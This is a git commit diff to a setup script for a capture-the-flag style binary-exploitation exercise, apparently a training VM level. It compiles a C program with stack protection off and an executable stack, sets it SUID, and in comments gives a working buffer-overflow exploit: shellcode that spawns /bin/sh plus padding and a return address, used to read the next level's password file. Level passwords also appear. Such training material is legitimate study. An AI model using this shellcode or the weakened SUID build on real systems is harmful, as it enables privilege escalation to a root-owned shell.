7c9aeef81fdf6e25d84011147ecfcc60c8fdca3d
maxisimo <maxime.simon42@gmail.com>
2020-11-01 19:43:43 +0100

    [ADD] Ressources

--- level2/Ressources/script.sh
+++ level2/Ressources/script.sh
@@ -4,10 +4,10 @@
 # -------------------------------- PREREQUIRES -------------------------------- #
 #                            From your local machine                            #
 #       Copy the source and the script files in the tmp folder in your VM       #
-#                  scp -P 4242 path/source.c level1@VM_IP:/tmp                  #
-#                  scp -P 4242 path/script.sh level1@VM_IP:/tmp                 #
+#                  scp -P 4242 path/source.c level3@VM_IP:/tmp                  #
+#                  scp -P 4242 path/script.sh level3@VM_IP:/tmp                 #
 #                                                                               #
-#     pwd: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a     #
+#     pwd: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02     #
 #                                                                               #
 #                                                                               #
 #                                                                               #
@@ -15,22 +15,24 @@
 # ----------------------------------------------------------------------------- #
 
 # Compile the program
-gcc source.c -o ft_level0
+gcc -fno-stack-protector source.c -z execstack -o ft_level2
+# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
+# -z execstack : https://security.stackexchange.com/questions/186506/how-does-gcc-compiler-guard-stack-for-stack-overflow
 
 # Set SUID to give root user permissions
-chmod u+s ft_level0
+chmod u+s ft_level2
 
 # Add write and execution permissions on home directory
 chmod +wx ~
 
 # Move the program to home directory
-mv ft_level0 ~
+mv ft_level2 ~
 
 
-# Then you have to run the program and cat .pass as level0 by taping manually these commands
+# Then you have to run the program and cat .pass as level2 by taping manually these commands
 
-# ----------------------------------- #
-#              su level0              #
-#   /home/user/level1/ft_level0 423   #
-#     cat /home/user/level1/.pass     #
-# ----------------------------------- #
+#	su level2
+# // the new return address of malloc() function is 0x0804b008
+#	python -c "print '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 'a' * 54 + '\x08\xb0\x04\x08'" >/tmp/exploit
+#	cat /tmp/exploit - | /home/user/level3/ft_level2
+#	cat /home/user/level3/.pass
